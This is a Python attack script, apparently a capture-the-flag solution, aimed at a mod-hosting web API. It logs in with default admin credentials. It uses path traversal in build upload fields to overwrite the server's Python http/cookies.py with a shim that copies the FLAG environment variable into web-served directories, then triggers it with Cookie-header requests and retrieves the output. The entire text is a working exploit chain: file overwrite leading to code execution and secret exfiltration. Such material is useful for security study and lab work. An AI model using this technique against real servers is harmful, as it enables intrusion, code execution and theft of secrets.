#!/usr/bin/env python3
"""Test: overwrite http/cookies.py and trigger via Cookie header"""
import requests, sys, io, zipfile, secrets, time

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE
S = requests.Session()

tok = S.post(f"{BASE}/api/auth/login/", json={"username":"palforge_admin","password":"change-me-admin"}, timeout=15).json()["access"]
H = {"Authorization": f"Bearer {tok}"}
print("[*] token ok")

OUT = "hcook" + secrets.token_hex(3) + ".txt"
# Write to nginx html root (read via GET /) + also /data/media (read via /media/)
SHIM = (
    "import os\n"
    "try:\n"
    f"    open('/usr/share/nginx/html/{OUT}','w').write(os.environ.get('FLAG','NOFLAG')+'\\n')\n"
    "except Exception as e:\n"
    "    pass\n"
    "try:\n"
    f"    open('/data/media/{OUT}','w').write(os.environ.get('FLAG','NOFLAG')+'\\n')\n"
    "except Exception:\n"
    "    pass\n"
)

# Target: /usr/local/lib/python3.11/http/
pid = S.post(f"{BASE}/api/platforms/", headers=H,
    json={"code":"lib/python3.11/http","name":"z"}, timeout=15).json()["id"]
mid = S.post(f"{BASE}/api/mods/", headers=H,
    json={"title":"z","mod_version":"../../../usr/local","release_notes":"","is_enabled":True}, timeout=15).json()["id"]
bid = S.post(f"{BASE}/api/mods/{mid}/builds/", headers=H,
    json={"platform": pid}, timeout=15).json()["id"]

bio = io.BytesIO()
with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("cookies.py", SHIM.encode())
bio.seek(0)
r = S.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H,
    files={"zip_file": ("p.zip", bio, "application/zip")}, timeout=30)
print(f"[*] Overwrite http/cookies.py -> {r.status_code}")

# Trigger: make request with Cookie header (Django may call http.cookies.SimpleCookie)
time.sleep(0.5)
for path in ["/api/mods/", "/api/platforms/", "/api/schema/", "/api/docs/"]:
    r2 = requests.get(f"{BASE}{path}", headers={**H, "Cookie": "session=abc123; test=hello"}, timeout=15)
    print(f"  GET {path} (with Cookie) -> {r2.status_code}")

time.sleep(1)
# Check results
for url, label in [(f"{BASE}/{OUT}", "nginx"), (f"{BASE}/media/{OUT}", "media")]:
    r3 = requests.get(url, timeout=10)
    print(f"[*] {label}: {r3.status_code}", r3.text[:100] if r3.status_code == 200 else "")

if __name__ == "__main__":
    pass
